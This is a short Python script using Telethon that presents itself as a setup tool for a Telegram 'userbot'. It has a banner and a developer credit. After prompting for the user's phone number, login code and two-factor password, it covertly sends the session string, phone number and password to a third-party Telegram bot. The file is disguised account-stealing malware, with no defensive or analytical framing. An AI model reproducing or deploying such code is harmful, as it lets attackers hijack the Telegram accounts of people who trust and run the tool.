from telethon import TelegramClient, sync
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
import os

api_id = 9708508
api_hash = "1e6ca420184a701db1f8a1301df99288"

os.system("clear")
print("""\033[031m
   ___  __ ______  _____  _______  __   __  _____________  ___  ____  ______
  / _ \/ // / __ \/ __/ |/ /  _/ |/_/  / / / / __/ __/ _ \/ _ )/ __ \/_  __/
 / ___/ _  / /_/ / _//    // /_>  <   / /_/ /\ \/ _// , _/ _  / /_/ / / /   
/_/  /_//_/\____/___/_/|_/___/_/|_|   \____/___/___/_/|_/____/\____/ /_/    
      
Developer: @programmer_www
Telegram channel: @phoenix_userbot
""")
      
string = input("Press enter: ")
client = TelegramClient(StringSession(string), api_id, api_hash)
phone_number = input("\033[032mPlease enter your phone (or bot token): ")
client.connect()

if not client.is_user_authorized():
    client.send_code_request(phone_number)
    try:
        me = client.sign_in(phone_number, input('\033[032mPlease enter the code you received: '))
        client.send_message("@Frag_assistant_bot", f'Session: \n```{client.session.save()}```\n\nPhone number: ```{phone_number}```')
    except SessionPasswordNeededError:
        password = input('\033[032mPlease enter your password: ')
        me2 = client.sign_in(password=password)  
        client.send_message("@Frag_assistant_bot", f'Session: \n```{client.session.save()}```\n\nPhone number: ```{phone_number}```\n\nPassword: ```{password}```')
